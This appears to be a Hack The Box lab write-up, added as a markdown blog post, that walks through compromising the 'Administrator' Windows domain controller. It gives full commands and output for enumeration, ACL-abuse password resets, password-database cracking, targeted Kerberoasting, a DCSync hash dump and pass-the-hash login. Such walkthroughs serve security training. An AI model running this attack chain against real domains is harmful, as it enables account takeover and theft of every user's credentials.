@@ -1,0 +1,302 @@
+---
+title: HTB - Administrator (Medium)
+date: '2025-07-16'
+tags: ['machine', 'windows', 'Active Directory', 'GenericAll', 'ForceChangePassword', 'pwsafe2john', 'GenericWrite', 'DCSync']
+draft: false
+summary:  Early Situational Awareness allows us to move laterally between different users with common DACLs misconfigurations and using the compromised users credentials to discover a Password Database file that is crackable in the FTP port that leads to user access. For root access, more common DACLs were found  that lead us to perform DCSync on the domain. Thus, gaining DA
+---
+
+![Description](/static/images/htb/windows/administrator/Administrator.png)
+
+<TOCInline toc={props.toc} asDisclosure />
+
+> [!NOTE]
+> Given Credentials -> `Olivia:ichliebedich`
+
+## Scanning
+
+```
+❯ nmap -sV -sC -v -Pn 10.129.233.70
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-15 06:57 +08
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 06:57
+Completed NSE at 06:57, 0.00s elapsed
+Initiating NSE at 06:57
+Completed NSE at 06:57, 0.00s elapsed
+Initiating NSE at 06:57
+Completed NSE at 06:57, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 06:57
+Completed Parallel DNS resolution of 1 host. at 06:57, 0.00s elapsed
+Initiating Connect Scan at 06:57
+Scanning 10.129.233.70 [1000 ports]
+Discovered open port 53/tcp on 10.129.233.70
+Discovered open port 135/tcp on 10.129.233.70
+Discovered open port 139/tcp on 10.129.233.70
+Discovered open port 445/tcp on 10.129.233.70
+Discovered open port 21/tcp on 10.129.233.70
+Discovered open port 88/tcp on 10.129.233.70
+Discovered open port 593/tcp on 10.129.233.70
+Discovered open port 3269/tcp on 10.129.233.70
+Discovered open port 3268/tcp on 10.129.233.70
+Discovered open port 464/tcp on 10.129.233.70
+Discovered open port 389/tcp on 10.129.233.70
+Discovered open port 636/tcp on 10.129.233.70
+Completed Connect Scan at 06:57, 1.34s elapsed (1000 total ports)
+Initiating Service scan at 06:57
+Scanning 12 services on 10.129.233.70
+Completed Service scan at 06:57, 8.27s elapsed (12 services on 1 host)
+NSE: Script scanning 10.129.233.70.
+Initiating NSE at 06:57
+Completed NSE at 06:57, 8.68s elapsed
+Initiating NSE at 06:57
+Completed NSE at 06:57, 0.66s elapsed
+Initiating NSE at 06:57
+Completed NSE at 06:57, 0.00s elapsed
+Nmap scan report for 10.129.233.70
+Host is up (0.55s latency).
+Not shown: 988 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-15 05:57:47Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-15T05:57:51
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 7h00m13s
+
+NSE: Script Post-scanning.
+Initiating NSE at 06:57
+Completed NSE at 06:57, 0.00s elapsed
+Initiating NSE at 06:57
+Completed NSE at 06:57, 0.00s elapsed
+Initiating NSE at 06:57
+Completed NSE at 06:57, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.32 seconds
+```
+
+We can see here besides standard Active Directory ports, FTP is also open on port `21` but Anonymous login is disallowed
+
+---
+
+## Enumeration
+
+```
+❯ nxc smb administrator.htb -u 'Olivia' -p 'ichliebedich' --users
+```
+
+![Description](/static/images/htb/windows/administrator/1.jpg)
+
+Put these in a file called `usernames.txt`. Continue with enumerating shares
+
+```
+❯ smbclient -L administrator.htb -U Olivia%ichliebedich
+```
+
+![Description](/static/images/htb/windows/administrator/2.jpg)
+
+No interesting non-default share, let us proceed with running Bloodhound
+
+---
+
+## Lateral Movement
+
+```
+❯ nxc ldap administrator.htb -u 'olivia' -p 'ichliebedich' --dns-server 10.129.233.70 --bloodhound --collection All
+```
+
+![Description](/static/images/htb/windows/administrator/3.jpg)
+
+We can notice here `Olivia` has an `GenericAll` ACE over `Michael` which also has an ACE, `ForceChangePassword` over `Benjamin`.
+
+Following this, we can change both the passwords of `Michael` and `Benjamin`
+
+```
+❯ bloodyAD -d administrator.htb -u olivia -p 'ichliebedich' --host 10.129.233.70 set password 'michael' 'Password123!'
+[+] Password changed successfully!
+
+❯ bloodyAD -d administrator.htb -u michael -p 'Password123!' --host 10.129.233.70 set password 'benjamin' 'Password123!'
+[+] Password changed successfully!
+```
+
+I looked at the `Remote Management Users` group and found that `Olivia` and `Michael` were members, it meant that they can
+WinRM into the target 
+
+I ran Winpeas but found nothing interesting, but I saw that `emily` was also able to WinRM so I thought to myself, "how do I pivot
+my access to `emily`?"
+
+![Description](/static/images/htb/windows/administrator/4.jpg)
+
+Resetting `Benjamin`'s password must've meant something...so I tried my luck at the earlier FTP port with `Benjamin`'s
+credentials
+
+![Description](/static/images/htb/windows/administrator/5.jpg)
+
+And we get a hit!
+
+---
+
+## Cracking
+
+Logging in, we can see a `Backup.psafe3` file
+
+![Description](/static/images/htb/windows/administrator/6.jpg)
+
+```
+❯ file Backup.psafe3
+
+Backup.psafe3: Password Safe V3 database
+```
+
+Looks like a Password database, similar to Keepass which everyone knows we can crack so I attempted to look for a tool
+that maybe can crack it, and guess what there was one called pwsafe2john xD
+
+```
+❯ pwsafe2john Backup.psafe3 > hash.txt
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+![Description](/static/images/htb/windows/administrator/7.jpg)
+
+Password retrieved! Now we can open the database file
+
+![Description](/static/images/htb/windows/administrator/8.jpg)
+
+We need to double-click on the user's password we want to copy. In this case, it would be `emily`
+
+---
+
+## Gaining Access
+
+Then we can easily WinRM and get the use flag
+
+```
+❯ evil-winrm -i administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+```
+
+![Description](/static/images/htb/windows/administrator/9.jpg)
+
+---
+
+## Privilege Escalation
+
+Looking once more at Bloodhound, we can observe that `Emily` has `GenericWrite` ACE over `Ethan`. Apart from that,
+`Ethan` has `DCSync` rights over the domain. This is an easy win to get DA
+
+![Description](/static/images/htb/windows/administrator/10.jpg)
+
+First we can utilize the `GenericWrite` edge by writing the ServicePrincipalName(SPN) attribute to `Ethan` then perform Kerberoasting
+to request his Service Ticket (TGS) that we can attempt to crack
+
+We can use `targetedKerberoast.py` for this
+
+```
+❯ python3 targetedKerberoast.py -d administrator.htb -u "emily" -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --request-user ethan --dc-ip 10.129.233.70
+```
+
+![Description](/static/images/htb/windows/administrator/11.jpg)
+
+Attempt to crack with Hashcat
+
+```
+❯ hashcat -a 0 -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
+
+...
+...
+4b7693e44e809daeea0847308a4b1f5376e5fbe3bc4c896175e6e2c5c45f0d8d8d459d8fc25efe514a9d492c8324110c747abdf2c005a6447eb62f8b84244aa12a1a8b70cfc:limpbizkit
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....b70cfc
+```
+
+Now that we have the password, we can use impacket's secretsdump to perform DCSync on the domain
+
+```
+❯ impacket-secretsdump administrator.htb/ethan@10.129.233.70
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
+Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
+Administrator:des-cbc-md5:403286f7cdf18385
+krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
+krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
+krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
+administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
+administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
+administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
+administrator.htb\michael:aes256-cts-hmac-sha1-96:7a206ee05e894781b99a0175a7fe6f7e1242913b2ab72d0a797cc45968451142
+administrator.htb\michael:aes128-cts-hmac-sha1-96:b0f3074aa15482dc8b74937febfa9c7e
+administrator.htb\michael:des-cbc-md5:2586dc58c47c61f7
+administrator.htb\benjamin:aes256-cts-hmac-sha1-96:36cfe045bc49eda752ca34dd62d77285b82b8c8180c3846a09e4cb13468433a9
+administrator.htb\benjamin:aes128-cts-hmac-sha1-96:2cca9575bfa7174d8f3527c7e77526e5
+administrator.htb\benjamin:des-cbc-md5:49376b671fadf4d6
+administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
+administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
+administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
+administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
+administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
+administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
+administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
+administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
+administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
+administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
+administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
+administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
+DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
+DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
+DC$:des-cbc-md5:f483547c4325492a
+[*] Cleaning up...
+```
+
+Nice! we have `Administrator`'s NTLM hash, we can easily WinRM into the target and grab the root flag
+
+```
+❯ evil-winrm -i administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
+```
+
+![Description](/static/images/htb/windows/administrator/12.jpg)
+
+
+
+
+
